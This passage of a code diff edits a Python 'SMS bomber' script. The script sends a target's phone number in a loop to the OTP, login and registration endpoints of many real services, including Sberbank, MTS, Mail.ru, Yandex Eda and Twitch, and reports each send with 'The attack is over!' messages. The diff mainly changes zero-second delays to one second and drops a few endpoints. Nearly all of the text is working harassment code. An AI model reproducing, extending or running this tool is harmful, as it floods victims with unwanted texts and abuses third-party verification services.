             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11674,7 +11311,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11687,7 +11324,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11700,7 +11337,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11711,7 +11348,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11724,7 +11361,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11735,7 +11372,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11748,7 +11385,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -11761,7 +11398,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11773,7 +11410,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11789,7 +11426,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11802,7 +11439,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11815,7 +11452,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11827,7 +11464,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11838,7 +11475,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11849,7 +11486,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11860,7 +11497,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11872,7 +11509,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11885,7 +11522,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11897,33 +11534,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -11932,7 +11546,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -12304,28 +11918,6 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
@@ -12452,7 +12044,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -12464,7 +12056,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -12475,7 +12067,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -12487,7 +12079,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -12498,7 +12090,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -12511,7 +12103,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -12522,7 +12114,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
